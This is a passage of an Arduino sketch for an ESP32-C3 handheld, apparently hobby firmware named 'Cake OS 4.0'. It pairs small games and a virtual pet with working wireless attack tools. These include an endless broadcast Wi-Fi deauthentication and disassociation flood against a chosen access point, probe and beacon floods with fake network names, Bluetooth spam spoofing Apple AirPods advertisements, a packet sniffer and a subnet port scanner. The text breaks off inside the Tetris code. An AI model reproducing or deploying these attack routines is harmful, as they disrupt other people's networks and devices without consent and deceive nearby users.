/*
 * Cake OS 4.0
 * ESP32-C3 SuperMini + ST7735 80x160
 * 按键: GPIO 0(上/1) 1(下/2) 2(左/3) 3(右/4)
 * 版本名固定 4.0
 */

#include <SPI.h>
#include <TFT_eSPI.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <EEPROM.h>
#include <NimBLEDevice.h>

// ==================== 真实碰撞箱：矩形结构体 ====================
// 注意：必须放在所有函数之前，否则 Arduino 自动生成的原型会引用未定义类型
struct Rect { int x, y, w, h; };

TFT_eSPI tft = TFT_eSPI();

#define WIFI_SSID     "WiFi名"
#define WIFI_PASSWORD "密码"

#define BTN_UP    0
#define BTN_DOWN  1
#define BTN_LEFT  2
#define BTN_RIGHT 3

const char* VERSION = "4.0";
const char* DEVICE_NAME = "CakeOS";

const char* mainMenu[] = {
  "WiFi Scan", "IP Scan", "Deauth", "Probe Flood",
  "Beacon Flood", "BLE Scan", "BLE Spam", "Sniffer",
  "Chan Optimize", "Tetris", "Breakout", "Snake",
  "Dino Run", "Pet Fish", "About"
};
const int menuCount = 15;

int selectedMenu = 0;
int menuOffset = 0;

// ==================== 主菜单重绘缓存 ====================
int lastDrawnMenu = -1;
int lastDrawnOffset = -1;

unsigned long lastPressTime[4] = {0,0,0,0};
bool waitingDouble[4] = {false,false,false,false};
const unsigned long DOUBLE_WINDOW = 200;

bool wifiInited = false;
bool bleInited = false;
bool wifiConfigured = false;
bool wifiWasConnected = false;

int lastWifiDisplay = -1;
unsigned long lastWifiCheck = 0;

unsigned long wifiDisconnectTime = 0;
unsigned long wifiReconnectDelay = 5000;
const unsigned long WIFI_MIN_DELAY = 5000;
const unsigned long WIFI_MAX_DELAY = 60000;
int wifiDisconnectCount = 0;

// ==================== 宠物系统 ====================
#define PET_EEPROM_ADDR 100
#define PET_MAGIC 0xCA9F

struct PetData {
  uint8_t hunger, mood, energy, clean, health;
  uint8_t level;
  uint16_t exp, coins, ach;
  uint16_t magic;
};
PetData pet;

struct FoodItem {
  const char* name;
  int8_t dHunger, dMood, dClean, dHealth;
  uint16_t cost;
};
const FoodItem FOODS[] = {
  {"Fish",    20,  5,  0,  0,  5},
  {"Seaweed", 15,  0, -5,  0,  3},
  {"Cake",    25, 15,  0, -5, 10},
  {"Vitamin", 10,  5,  0, 20, 15}
};
const int FOOD_COUNT = 4;

const char* ACH_NAMES[] = {
  "First Meal", "First Play", "First Sleep", "First Bath",
  "Level 5", "Level 10", "100 Coins", "Game Win"
};
const int ACH_COUNT = 8;

void petLoad() {
  EEPROM.get(PET_EEPROM_ADDR, pet);
  if (pet.magic != PET_MAGIC) {
    pet.hunger = 80; pet.mood = 80; pet.energy = 80;
    pet.clean = 90; pet.health = 100;
    pet.level = 1; pet.exp = 0; pet.coins = 5;   // 原 10 → 5
    pet.ach = 0; pet.magic = PET_MAGIC;
  }
  if (pet.hunger > 100) pet.hunger = 100;
  if (pet.mood > 100) pet.mood = 100;
  if (pet.energy > 100) pet.energy = 100;
  if (pet.clean > 100) pet.clean = 100;
  if (pet.health > 100) pet.health = 100;
  if (pet.level < 1) pet.level = 1;
}
void petSave() { EEPROM.put(PET_EEPROM_ADDR, pet); EEPROM.commit(); }

void petUnlock(uint8_t bit) {
  if (!(pet.ach & (1 << bit))) { pet.ach |= (1 << bit); petSave(); }
}
void petAddCoins(uint16_t n) {
  pet.coins += n;
  if (pet.coins >= 100) petUnlock(6);
  petSave();
}
void petAddExp(uint16_t n) {
  pet.exp += n;
  while (pet.exp >= pet.level * 20) {
    pet.exp -= pet.level * 20;
    if (pet.level < 99) pet.level++;
  }
  if (pet.level >= 5)  petUnlock(4);
  if (pet.level >= 10) petUnlock(5);
  petSave();
}

uint16_t petGameReward(uint16_t base) {
  uint16_t reward = base;
  if (pet.mood >= 70) reward = (base * 3) / 2;   // 心情好 1.5 倍（保留）
  petAddCoins(reward);
  pet.mood += 3; if (pet.mood > 100) pet.mood = 100;
  petAddExp(3);
  petSave();
  return reward;
}

// ==================== WiFi 稳定性优化 ====================
bool connectWifi() {
  if (!wifiConfigured) return false;
  WiFi.persistent(false);
  WiFi.mode(WIFI_STA);
  WiFi.setSleep(false);
  WiFi.setAutoReconnect(true);
  WiFi.disconnect(true);
  delay(100);
  esp_wifi_set_max_tx_power(80);
  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 8000) {
    delay(100);
  }
  if (WiFi.status() == WL_CONNECTED) {
    wifiWasConnected = true;
    wifiReconnectDelay = WIFI_MIN_DELAY;
    wifiDisconnectCount = 0;
    wifiDisconnectTime = 0;
    return true;
  }
  return false;
}

void startWifiAsync() {
  if (!wifiConfigured) return;
  WiFi.persistent(false);
  WiFi.mode(WIFI_STA);
  WiFi.setSleep(false);
  WiFi.setAutoReconnect(true);
  esp_wifi_set_max_tx_power(80);
  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
  wifiDisconnectTime = millis();
  wifiDisconnectCount = 0;
  wifiReconnectDelay = WIFI_MIN_DELAY;
}

void deinitWifi() { if (wifiInited) { esp_wifi_stop(); esp_wifi_deinit(); wifiInited = false; } }

void restartWifi() {
  if (!wifiConfigured) return;
  WiFi.persistent(false);
  WiFi.mode(WIFI_STA);
  WiFi.setSleep(false);
  WiFi.setAutoReconnect(true);
  esp_wifi_set_max_tx_power(80);
  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
  wifiDisconnectTime = millis();
  wifiDisconnectCount = 0;
  wifiReconnectDelay = WIFI_MIN_DELAY;
}

void deinitBLE() { if (bleInited) { NimBLEDevice::deinit(true); bleInited = false; } }

#define MAX_BLE_DEVICES 20
struct BLEDeviceInfo { char name[32]; int rssi; };
BLEDeviceInfo bleDevices[MAX_BLE_DEVICES];
int bleDeviceCount = 0;

#define MAX_SNIFF 15
struct SniffEntry { uint8_t mac[6]; char ssid[33]; int rssi; };
SniffEntry sniffList[MAX_SNIFF];
int sniffCount = 0;
volatile bool sniffRunning = false;

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!sniffRunning || type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;
  uint8_t fc = p[0];
  uint8_t sub = (fc >> 4) & 0x0F;
  uint8_t ftype = (fc >> 2) & 0x03;
  if (ftype != 0x00 || sub != 4) return;
  int i = 24;
  char ssid[33] = {0};
  while (i + 1 < len) {
    uint8_t tag = p[i], tagLen = p[i+1];
    if (i + 2 + tagLen > len) break;
    if (tag == 0 && tagLen > 0 && tagLen <= 32) {
      memcpy(ssid, &p[i+2], tagLen); ssid[tagLen] = 0; break;
    }
    i += 2 + tagLen;
  }
  if (ssid[0] == 0) return;
  for (int k = 0; k < sniffCount; k++) {
    if (memcmp(sniffList[k].mac, &p[10], 6) == 0) {
      strncpy(sniffList[k].ssid, ssid, 32); sniffList[k].ssid[32] = 0; return;
    }
  }
  if (sniffCount < MAX_SNIFF) {
    memcpy(sniffList[sniffCount].mac, &p[10], 6);
    strncpy(sniffList[sniffCount].ssid, ssid, 32);
    sniffList[sniffCount].ssid[32] = 0;
    sniffList[sniffCount].rssi = pkt->rx_ctrl.rssi;
    sniffCount++;
  }
}

// ==================== 屏幕工具 ====================
void clearAll() { tft.fillScreen(TFT_BLACK); }
void titleBar(const char* t) { tft.drawString(t, 2, 0); }

// ==================== 真实碰撞箱（矩形集合） ====================
Rect makeRect(int x, int y, int w, int h) { Rect r; r.x = x; r.y = y; r.w = w; r.h = h; return r; }
bool rectOverlap(const Rect& a, const Rect& b) {
  return a.x < b.x + b.w && a.x + a.w > b.x &&
         a.y < b.y + b.h && a.y + a.h > b.y;
}

void updateWifiStatusBar() {
  int state;
  if (WiFi.status() == WL_CONNECTED) state = 1;
  else if (wifiConfigured && wifiDisconnectTime > 0) state = 2;
  else state = 0;
  if (state == lastWifiDisplay) return;
  lastWifiDisplay = state;
  tft.fillRect(95, 0, 65, 10, TFT_BLACK);
  if (state == 1) { tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString("WIFI:on", 100, 0); }
  else if (state == 2) { tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("WIFI...", 100, 0); }
  else { tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawString("WIFI:off", 100, 0); }
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
}

// ==================== 主菜单（只在变化时重绘） ====================
void drawMainMenu() {
  if (lastDrawnMenu == selectedMenu && lastDrawnOffset == menuOffset) return;
  lastDrawnMenu = selectedMenu;
  lastDrawnOffset = menuOffset;

  clearAll();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("CakeOS:v" + String(VERSION), 2, 0);

  lastWifiDisplay = -1;
  updateWifiStatusBar();

  if (menuOffset > menuCount - 4) menuOffset = menuCount - 4;
  if (menuOffset < 0) menuOffset = 0;
  int y = 14;
  for (int i = menuOffset; i < menuOffset + 4 && i < menuCount; i++) {
    String pre = (i == selectedMenu) ? "> " : "  ";
    tft.drawString(pre + mainMenu[i], 2, y);
    y += 12;
  }
}

char getKey() {
  unsigned long now = millis();
  int pins[4] = {BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT};
  for (int i = 0; i < 4; i++) {
    if (digitalRead(pins[i]) == LOW) {
      delay(8);
      if (digitalRead(pins[i]) == LOW) {
        while (digitalRead(pins[i]) == LOW) delay(3);
        if (waitingDouble[i] && (now - lastPressTime[i] < DOUBLE_WINDOW)) {
          waitingDouble[i] = false;
          if (i == 3) return 'E';
        } else { waitingDouble[i] = true; lastPressTime[i] = now; }
      }
    }
  }
  for (int i = 0; i < 4; i++) {
    if (waitingDouble[i] && (now - lastPressTime[i] >= DOUBLE_WINDOW)) {
      waitingDouble[i] = false;
      if (i == 0) return 'U';
      if (i == 1) return 'D';
      if (i == 2) return 'L';
      if (i == 3) return 'R';
    }
  }
  return 0;
}

char getGameKey() {
  int pins[4] = {BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT};
  unsigned long now = millis();
  const unsigned long REPEAT_INTERVAL = 30;
  const unsigned long DOUBLE_WINDOW_G = 400;
  static bool pressed[4] = {false,false,false,false};
  static unsigned long lastPress[4] = {0,0,0,0};
  static unsigned long lastRepeat[4] = {0,0,0,0};
  for (int i = 0; i < 4; i++) {
    bool nowPressed = (digitalRead(pins[i]) == LOW);
    if (nowPressed && !pressed[i]) {
      delay(2);
      if (digitalRead(pins[i]) != LOW) { nowPressed = false; }
      else {
        pressed[i] = true;
        if (i == 3 && (now - lastPress[3] < DOUBLE_WINDOW_G) && lastPress[3] > 0) {
          lastPress[3] = 0; return 'E';
        }
        lastPress[i] = now; lastRepeat[i] = now;
        if (i == 0) return 'U';
        if (i == 1) return 'D';
        if (i == 2) return 'L';
        if (i == 3) return 'R';
      }
    } else if (!nowPressed && pressed[i]) {
      pressed[i] = false;
    } else if (nowPressed && pressed[i]) {
      if (now - lastRepeat[i] > REPEAT_INTERVAL) {
        lastRepeat[i] = now;
        if (i == 0) return 'U';
        if (i == 1) return 'D';
        if (i == 2) return 'L';
        if (i == 3) return 'R';
      }
    }
  }
  return 0;
}

char getTetrisKey() {
  int pins[4] = {BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT};
  unsigned long now = millis();
  const unsigned long MOVE_INITIAL_DELAY = 180;  // 长按后首次重复前的阻尼
  const unsigned long MOVE_REPEAT = 90;          // 阻尼后的重复间隔，一格一格
  const unsigned long ROTATE_DEBOUNCE = 800;
  const unsigned long HARDROP_DEBOUNCE = 1000;
  const unsigned long DOUBLE_WINDOW_G = 400;
  static bool pressed[4] = {false,false,false,false};
  static unsigned long lastPress[4] = {0,0,0,0};
  static unsigned long lastRepeat[4] = {0,0,0,0};
  static unsigned long lastRotate = 0, lastHardDrop = 0;
  for (int i = 0; i < 4; i++) {
    bool nowPressed = (digitalRead(pins[i]) == LOW);
    if (nowPressed && !pressed[i]) {
      delay(3);
      if (digitalRead(pins[i]) != LOW) { nowPressed = false; }
      else {
        pressed[i] = true;
        if (i == 3 && (now - lastPress[3] < DOUBLE_WINDOW_G) && lastPress[3] > 0) {
          lastPress[3] = 0; return 'E';
        }
        lastPress[i] = now; lastRepeat[i] = now;
        if (i == 0) return 'U';     // 立即左移一格
        if (i == 1) return 'D';     // 立即右移一格
        if (i == 2) {
          if (now - lastRotate > ROTATE_DEBOUNCE) { lastRotate = now; return 'L'; }
          return 0;
        }
        if (i == 3) {
          if (now - lastHardDrop > HARDROP_DEBOUNCE) { lastHardDrop = now; return 'R'; }
          return 0;
        }
      }
    } else if (!nowPressed && pressed[i]) {
      pressed[i] = false;
    } else if (nowPressed && pressed[i]) {
      if (i == 2 || i == 3) continue;   // 旋转/硬降不连发
      // 长按：先等 MOVE_INITIAL_DELAY 才有阻尼感，之后每隔 MOVE_REPEAT 走一格
      unsigned long held = now - lastPress[i];
      if (held > MOVE_INITIAL_DELAY && now - lastRepeat[i] > MOVE_REPEAT) {
        lastRepeat[i] = now;
        if (i == 0) return 'U';
        if (i == 1) return 'D';
      }
    }
  }
  return 0;
}

char getSnakeKey() {
  static bool prevState[4] = {true, true, true, true};
  static unsigned long lastPress[4] = {0,0,0,0};
  const unsigned long DEBOUNCE = 50;
  int pins[4] = {BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT};
  for (int i = 0; i < 4; i++) {
    bool nowPressed = (digitalRead(pins[i]) == LOW);
    if (nowPressed && prevState[i] && (millis() - lastPress[i] > DEBOUNCE)) {
      prevState[i] = false; lastPress[i] = millis();
      if (i == 0) return 'U';
      if (i == 1) return 'D';
      if (i == 2) return 'L';
      if (i == 3) return 'R';
    } else if (!nowPressed && !prevState[i]) {
      prevState[i] = true;
    }
  }
  return 0;
}

void waitExit() {
  while (true) {
    char k = getKey();
    if (k == 'R' || k == 'E') return;
    delay(20);
  }
}

void initRawWifi() {
  WiFi.mode(WIFI_OFF); delay(100);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_max_tx_power(80);
  wifiInited = true;
}

// ==================== 1. WiFi 扫描 ====================
void showWifiScan() {
  clearAll(); titleBar("Scanning...");
  bool wasConnected = (WiFi.status() == WL_CONNECTED);
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  if (wasConnected && wifiConfigured) WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
  if (n <= 0) { clearAll(); titleBar("No networks"); waitExit(); return; }
  int sel = 0, off = 0;
  while (true) {
    clearAll(); titleBar("WiFi Networks");
    int startY = 14, visible = 4;
    if (sel < off) off = sel;
    if (sel >= off + visible) off = sel - visible + 1;
    for (int i = 0; i < visible && off + i < n; i++) {
      int idx = off + i;
      String s = WiFi.SSID(idx).substring(0,8) + " " + String(WiFi.RSSI(idx)) + " c" + String(WiFi.channel(idx));
      String pre = (idx == sel) ? "> " : "  ";
      tft.drawString(pre + s, 2, startY + i * 12);
    }
    tft.drawString("Up/Down Move  R:Back", 2, 70);
    char k = getKey();
    if (k == 'U') { sel--; if (sel < 0) sel = n - 1; }
    else if (k == 'D') { sel++; if (sel >= n) sel = 0; }
    else if (k == 'R' || k == 'E') break;
    delay(20);
  }
}

// ==================== 2. IP 扫描 ====================
void showIPScan() {
  if (WiFi.status() != WL_CONNECTED) {
    clearAll(); titleBar("No WiFi");
    tft.drawString("Connect first", 2, 20);
    delay(1500); return;
  }
  clearAll(); titleBar("Scanning...");
  IPAddress gw = WiFi.gatewayIP();
  IPAddress myIP = WiFi.localIP();
  IPAddress foundIPs[20];
  int foundCount = 0;
  for (int i = 1; i < 255 && foundCount < 20; i++) {
    IPAddress target(gw[0], gw[1], gw[2], i);
    if (target == myIP) continue;
    WiFiClient client;
    if (client.connect(target, 80, 50) || client.connect(target, 443, 50)) {
      foundIPs[foundCount++] = target; client.stop();
    }
  }
  if (foundCount == 0) {
    clearAll(); titleBar("No devices");
    tft.drawString("GW:" + gw.toString(), 2, 14);
    tft.drawString("ME:" + myIP.toString(), 2, 26);
    waitExit(); return;
  }
  int sel = 0, off = 0;
  while (true) {
    clearAll(); titleBar("IP Devices");
    int startY = 14, visible = 4;
    if (sel < off) off = sel;
    if (sel >= off + visible) off = sel - visible + 1;
    for (int i = 0; i < visible && off + i < foundCount; i++) {
      int idx = off + i;
      String pre = (idx == sel) ? "> " : "  ";
      tft.drawString(pre + foundIPs[idx].toString(), 2, startY + i * 12);
    }
    tft.drawString("Up/Down Move  R:Back", 2, 70);
    char k = getKey();
    if (k == 'U') { sel--; if (sel < 0) sel = foundCount - 1; }
    else if (k == 'D') { sel++; if (sel >= foundCount) sel = 0; }
    else if (k == 'R' || k == 'E') break;
    delay(20);
  }
}

// ==================== 3. Deauth 超级加强 ====================
void sendSuperDeauth(uint8_t* bssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  // 26 字节: FC(2) Dur(2) DA(6) SA(6) BSSID(6) Seq(2) Reason(2)
  uint8_t deauth[26] = {
    0xC0,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0,0,0,0,0,0,
    0,0,0,0,0,0,
    0x00,0x00,
    0x07,0x00
  };
  memcpy(deauth+10, bssid, 6); memcpy(deauth+16, bssid, 6);
  uint8_t disassoc[26] = {
    0xA0,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0,0,0,0,0,0,
    0,0,0,0,0,0,
    0x00,0x00,
    0x01,0x00
  };
  memcpy(disassoc+10, bssid, 6); memcpy(disassoc+16, bssid, 6);
  for (int i = 0; i < 5; i++) esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
  for (int i = 0; i < 5; i++) esp_wifi_80211_tx(WIFI_IF_STA, disassoc, sizeof(disassoc), false);
}
void showDeauth() {
  clearAll(); titleBar("Scanning...");
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  if (!n) { titleBar("No AP"); delay(1000); return; }
  int sel = 0, off = 0;
  while (true) {
    clearAll(); titleBar("Select AP");
    int startY = 14, visible = 4;
    if (sel < off) off = sel;
    if (sel >= off + visible) off = sel - visible + 1;
    for (int i = 0; i < visible && off + i < n; i++) {
      int idx = off + i;
      String s = WiFi.SSID(idx).substring(0,14);
      String pre = (idx == sel) ? "> " : "  ";
      tft.drawString(pre + s, 2, startY + i * 12);
    }
    tft.drawString("L:OK  R:Back", 2, 70);
    char k = getKey();
    if (k == 'U') { sel--; if (sel < 0) sel = n - 1; }
    else if (k == 'D') { sel++; if (sel >= n) sel = 0; }
    else if (k == 'L') break;
    else if (k == 'R' || k == 'E') return;
    delay(20);
  }
  uint8_t bssid[6]; memcpy(bssid, WiFi.BSSID(sel), 6);
  uint8_t ch = WiFi.channel(sel);
  String ssid = WiFi.SSID(sel);
  clearAll(); titleBar("Super Deauth");
  tft.drawString(ssid.substring(0,12), 2, 20);
  initRawWifi();
  int cnt = 0;
  while (true) {
    sendSuperDeauth(bssid, ch); cnt++;
    if (cnt % 20 == 0) { tft.fillRect(0, 56, 160, 12, TFT_BLACK); tft.drawString("Pkts:" + String(cnt * 10), 2, 56); }
    char k = getKey();
    if (k == 'R' || k == 'E') break;
    delay(1);
  }
  deinitWifi();
}

// ==================== 4. 探针洪水 ====================
void sendProbe(const char* ssid) {
  uint8_t f[64] = {0x40,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
                   0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0};
  size_t len = strlen(ssid); if (len > 32) len = 32;
  f[24] = 0; f[25] = len; memcpy(&f[26], ssid, len);
  esp_wifi_80211_tx(WIFI_IF_STA, f, 26 + len, false);
}
void showProbeFlood() {
  clearAll(); titleBar("Probe Flood");
  tft.drawString("Sending...", 2, 20);
  initRawWifi();
  const char* fake[] = {"FreeWiFi","Home","Guest","TP-LINK","ChinaNet","CMCC"};
  int cnt = 0;
  while (true) {
    sendProbe(fake[random(0,6)]); cnt++;
    if (cnt % 200 == 0) tft.drawString("Pkts:" + String(cnt), 2, 50);
    char k = getKey();
    if (k == 'R' || k == 'E') break;
    delay(2);
  }
  deinitWifi();
}

// ==================== 5. 信标洪水 ====================
void sendBeacon(const char* ssid, uint8_t ch) {
  uint8_t b[128] = {0x80,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
                    1,2,3,4,5,6,1,2,3,4,5,6,
                    0,0,0,0,0,0,0,0,0,0,
                    0x64,0,0x11,0x04,0,0};
  size_t len = strlen(ssid); if (len > 32) len = 32;
  b[37] = len; memcpy(&b[38], ssid, len);
  // 修复: STA 模式下 AP 接口未启用，必须走 WIFI_IF_STA
  esp_wifi_80211_tx(WIFI_IF_STA, b, 38 + len, false);
}
void showBeaconFlood() {
  clearAll(); titleBar("Beacon Flood");
  tft.drawString("Sending...", 2, 20);
  initRawWifi();
  const char* fakeNames[] = {"FreeWiFi","CMCC","ChinaNet","Starbucks",
                             "Airport_Free","TP-LINK","MERCURY","HUAWEI"};
  uint8_t channels[] = {1, 6, 11};
  int chIdx = 0;
  unsigned long lastChSwitch = millis();
  int cnt = 0;
  while (true) {
    if (millis() - lastChSwitch > 3000) {
      lastChSwitch = millis();
      chIdx = (chIdx + 1) % 3;
      esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE);
    }
    for (int i = 0; i < 20; i++) {
      String s = fakeNames[random(0, 8)];
      sendBeacon(s.c_str(), channels[chIdx]);
      cnt++;
    }
    if (cnt % 200 == 0) {
      tft.fillRect(0, 50, 160, 12, TFT_BLACK);
      tft.drawString("B:" + String(cnt) + " ch" + String(channels[chIdx]), 2, 50);
    }
    char k = getKey();
    if (k == 'R' || k == 'E') break;
    delay(1);
  }
  deinitWifi();
}

// ==================== 8. 信道优化 ====================
void showChanOptimize() {
  clearAll(); titleBar("Scanning...");
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  int chCount[14] = {0};
  for (int i = 0; i < n; i++) {
    int ch = WiFi.channel(i);
    if (ch >= 1 && ch <= 13) chCount[ch]++;
  }
  int best = 1, minC = 999;
  for (int c = 1; c <= 13; c++) if (chCount[c] < minC) { minC = chCount[c]; best = c; }
  clearAll(); titleBar("Best Channel");
  tft.drawString("Ch:" + String(best), 2, 20);
  tft.drawString("APs:" + String(minC), 2, 34);
  waitExit();
}

// ==================== 6. BLE 扫描 ====================
class MyScanCallbacks : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* dev) override {
    if (dev->haveName()) {
      String name = dev->getName().c_str();
      int rssi = dev->getRSSI();
      for (int i = 0; i < bleDeviceCount; i++) {
        if (name.equals(bleDevices[i].name)) { bleDevices[i].rssi = rssi; return; }
      }
      if (bleDeviceCount < MAX_BLE_DEVICES) {
        strncpy(bleDevices[bleDeviceCount].name, name.c_str(), 31);
        bleDevices[bleDeviceCount].name[31] = '\0';
        bleDevices[bleDeviceCount].rssi = rssi;
        bleDeviceCount++;
      }
    }
  }
};
void showBLEScan() {
  deinitWifi();
  WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(200);
  clearAll(); titleBar("BLE Scan");
  NimBLEDevice::init("CakeOS");
  bleDeviceCount = 0;
  NimBLEScan* pScan = NimBLEDevice::getScan();
  // 修复: 用静态实例，避免每次进入都 new 造成内存泄漏
  static MyScanCallbacks scanCb;
  pScan->setScanCallbacks(&scanCb, false);
  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);
  pScan->start(0);
  bleInited = true;
  int sel = 0, off = 0;
  unsigned long lastRefresh = millis();
  while (true) {
    if (millis() - lastRefresh > 500) {
      lastRefresh = millis();
      clearAll(); titleBar("BLE Devices");
      int startY = 14, visible = 4;
      if (sel < off) off = sel;
      if (sel >= off + visible) off = sel - visible + 1;
      for (int i = 0; i < visible && off + i < bleDeviceCount; i++) {
        int idx = off + i;
        String pre = (idx == sel) ? "> " : "  ";
        String name = String(bleDevices[idx].name);
        if (name.length() == 0) name = "Unknown";
        tft.drawString(pre + name.substring(0,12) + " " + String(bleDevices[idx].rssi), 2, startY + i * 12);
      }
      tft.drawString("Up/Down Move  R:Back", 2, 70);
    }
    char k = getKey();
    if (k == 'U') { if (bleDeviceCount > 0) { sel--; if (sel < 0) sel = bleDeviceCount - 1; } }
    else if (k == 'D') { if (bleDeviceCount > 0) { sel++; if (sel >= bleDeviceCount) sel = 0; } }
    else if (k == 'R' || k == 'E') break;
    delay(20);
  }
  pScan->stop();
  deinitBLE();
}

// ==================== 7. BLE Spam ====================
void showBLESpam() {
  deinitWifi();
  WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(200);
  clearAll(); titleBar("BLE Spam");
  tft.drawString("Spamming...", 2, 20);
  NimBLEDevice::init("CakeOS");
  bleInited = true;
  NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
  NimBLEAdvertisementData advData;
  advData.setName("AirPods");
  advData.setManufacturerData(std::string("\x4C\x00\x02\x0F", 4));
  pAdv->setAdvertisementData(advData);
  pAdv->start();
  int cnt = 0;
  unsigned long lastChange = millis();
  while (true) {
    if (millis() - lastChange > 1000) {
      lastChange = millis();
      cnt++;
      String name = "AirPods" + String(random(1000));
      // 修复: 必须先 stop 再改数据，否则新名字不生效
      pAdv->stop();
      NimBLEAdvertisementData advData2;
      advData2.setName(name.c_str());
      advData2.setManufacturerData(std::string("\x4C\x00\x02\x0F", 4));
      pAdv->setAdvertisementData(advData2);
      pAdv->start();
      tft.fillRect(0, 50, 160, 12, TFT_BLACK);
      tft.drawString("Cnt:" + String(cnt), 2, 50);
    }
    char k = getKey();
    if (k == 'R' || k == 'E') break;
    delay(20);
  }
  pAdv->stop();
  deinitBLE();
}

// ==================== 8. Sniffer ====================
void showSniffer() {
  deinitWifi();
  clearAll(); titleBar("Sniffer");
  tft.drawString("Listening...", 2, 20);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);
  sniffCount = 0;
  sniffRunning = true;
  int sel = 0, off = 0;
  unsigned long lastRefresh = millis();
  while (true) {
    if (millis() - lastRefresh > 500) {
      lastRefresh = millis();
      clearAll();
      char titleBuf[24];
      snprintf(titleBuf, sizeof(titleBuf), "Sniff: %d", sniffCount);
      titleBar(titleBuf);
      int startY = 14, visible = 4;
      if (sel < off) off = sel;
      if (sel >= off + visible) off = sel - visible + 1;
      for (int i = 0; i < visible && off + i < sniffCount; i++) {
        int idx = off + i;
        String pre = (idx == sel) ? "> " : "  ";
        tft.drawString(pre + String(sniffList[idx].ssid).substring(0,14), 2, startY + i * 12);
      }
      tft.drawString("Up/Down  R:Back", 2, 70);
    }
    char k = getKey();
    if (k == 'U') { if (sniffCount > 0) { sel--; if (sel < 0) sel = sniffCount - 1; } }
    else if (k == 'D') { if (sniffCount > 0) { sel++; if (sel >= sniffCount) sel = 0; } }
    else if (k == 'R' || k == 'E') break;
    delay(20);
  }
  sniffRunning = false;
  esp_wifi_set_promiscuous(false);
  deinitWifi();
}

// ==================== 9. 俄罗斯方块 ====================
int tetrisGrid[20][10];
int pieceX, pieceY, pieceType, pieceRot;
const int TET_X = 30, TET_Y = 10, TET_CELL_W = 5, TET_CELL_H = 3;
const int pieces[7][4][4] = {
  {{1,1,1,1},{0,0,0,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,1,0},{1,0,0,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,1,0},{0,0,1,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,0,0},{1,1,0,0},{0,0,0,0},{0,0,0,0}},
  {{0,1,1,0},{1,1,0,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,0,0},{0,1,1,0},{0,0,0,0},{0,0,0,0}},
  {{1,1,1,0},{0,1,0,0},{0,0,0,0},{0,0,0,0}}
};
bool getShapeCell(int type, int rot, int row, int col) {
  int r = row, c = col;
  for (int k = 0; k < rot; k++) { int tmp = r; r = 3 - c; c = tmp; }
  if (r < 0 || r > 3 || c < 0 || c > 3) return false;
  return pieces[type][r][c] != 0;
}
void tetrisInit() {
  for (int y = 0; y < 20; y++) for (int x = 0; x < 10; x++) tetrisGrid[y][x] = 0;
  pieceType = random(7); pieceRot = 0; pieceX = 3; pieceY = 0;
}
bool tetrisCollide(int x, int y, int rot) {
  for (int i = 0; i < 4; i++) for (int j = 0; j < 4; j++) {
    if (getShapeCell(pieceType, rot, i, j)) {
      int gx = x + j, gy = y + i;
      if (gx < 0 || gx >= 10 || gy >= 20) return true;
      if (gy >= 0 && tetrisGrid[gy][gx]) return true;
    }
  }
  return false;
}
bool tryRotate() {
  int newRot = (pieceRot + 1) % 4;
  int offsets[5]; int offsetCount = 0;
  if (pieceType == 0) {
    if (pieceRot == 0) { offsets[offsetCount++] = 2; offsets[offsetCount++] = 1; offsets[offsetCount++] = -1; offsets[offsetCount++] = -2; offsets[offsetCount++] = 0; }
    else if (pieceRot == 1) { offsets[offsetCount++] = -2; offsets[offsetCount++] = -1; offsets[offsetCount++] = 1; offsets[offsetCount++] = 2; offsets[offsetCount++] = 0; }
    else if (pieceRot == 2) { offsets[offsetCount++] = -2; offsets[offsetCount++] = -1; offsets[offsetCount++] = 1; offsets[offsetCount++] = 2; offsets[offsetCount++] = 0; }
